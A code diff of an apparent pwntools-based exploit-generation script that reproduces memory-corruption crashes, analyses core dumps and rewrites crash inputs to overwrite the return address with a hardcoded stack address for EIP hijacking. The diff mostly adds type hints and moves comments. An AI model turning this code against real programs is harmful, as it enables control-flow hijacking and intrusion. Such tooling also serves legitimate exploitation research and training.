@@ -1,11 +1,11 @@
 from pwn import *
-from utils import cleanup, build_command
+from utils import build_command
 from exploit_utils import ENV_VARS
 import argparse
 import glob
 
 
-def reproducer(crash_input: bytes, arg_config: argparse.Namespace):
+def reproducer(crash_input: bytes, arg_config: argparse.Namespace) -> bool:
     """
     Validates that the input causes a memory corruption crash by reproducing that crash.
 
@@ -35,7 +35,6 @@ def reproducer(crash_input: bytes, arg_config: argparse.Namespace):
         stdin=subprocess.PIPE,
         stdout=subprocess.PIPE, 
         stderr=subprocess.PIPE, 
-        # text=True
     )
 
     #sending the crash input from stdin to all targets
@@ -57,7 +56,7 @@ def reproducer(crash_input: bytes, arg_config: argparse.Namespace):
         sys.exit(1)
 
 
-def root_cause_analysis(crash_input: bytes, arg_config: argparse.Namespace):
+def root_cause_analysis(crash_input: bytes, arg_config: argparse.Namespace) -> bool:
     """
     Triggers a test crash with the given input and extracts information from the resulting core dump.
     Analyzes the provided payload input to confirm whether it can reach and potentially overwrite
@@ -81,10 +80,9 @@ def root_cause_analysis(crash_input: bytes, arg_config: argparse.Namespace):
         stdin=subprocess.PIPE,
         stdout=subprocess.PIPE, 
         stderr=subprocess.PIPE, 
-        env={**os.environ, **ENV_VARS}
-        # text=True
+        env={**os.environ, **ENV_VARS}  #env={**os.environ, **ENV_VARS} => merges the current env variables with the additional ENV_VARS
     )
-    #env={**os.environ, **ENV_VARS} => merges the current env variables with the additional ENV_VARS
+    
 
     #sending the crash input from stdin to all targets
     crash_proc.communicate(input=crash_input)
@@ -125,6 +123,7 @@ def crash_explorer(crash_input: bytes, arg_config: argparse.Namespace):
         if reg_value in crash_input:
             print(f'{register} crashed with input bytes {reg_value}')
 
+            #strategy on picking valid addresses that will later align with the jump addr??????
             target = b'\xd0\xd0\xff\xff'
 
             payload_mutation = crash_input.replace(reg_value, target)
@@ -134,7 +133,7 @@ def crash_explorer(crash_input: bytes, arg_config: argparse.Namespace):
     return payload_mutation
 
 
-def payload_builder(crash_input: bytes, target_bin: str):
+def payload_builder(crash_input: bytes, target_bin: str) -> None:
     """
     Generates the final payload (byte sequence) for the exploitation process and writes it to a file.
     Overwrites the bytes that fall on the return address with a valid target address on the existing crash input, 
@@ -158,7 +157,7 @@ def payload_builder(crash_input: bytes, target_bin: str):
     return
 
 
-def overwrite_ra(crash_input: bytes, target_bin: str, target_ra: bytes):
+def overwrite_ra(crash_input: bytes, target_bin: str, target_ra: bytes) -> bytes:
     """
     Rewrites a crashing input to replace the return address for EIP hijacking. 
     The function extracts the EIP from a core dump, verifies it is present in the input, 
@@ -184,7 +183,7 @@ def overwrite_ra(crash_input: bytes, target_bin: str, target_ra: bytes):
     return payload
 
 
-def target_ra(target_bin: str):
+def target_ra(target_bin: str) -> int:
 
     #find in what adresses the stack fluctuates -> info proc mapping
 
@@ -193,8 +192,8 @@ def target_ra(target_bin: str):
 
     core = Corefile(core_path)
 
-    print(f"Stack Base: {hex(core.stack.start)}")
-    print(f"Stack Top: {hex(core.stack.stop)}")
+    # print(f"Stack Base: {hex(core.stack.start)}")
+    # print(f"Stack Top: {hex(core.stack.stop)}")
 
     stack_base = core.stack.start
     stack_limit = core.stack.stop
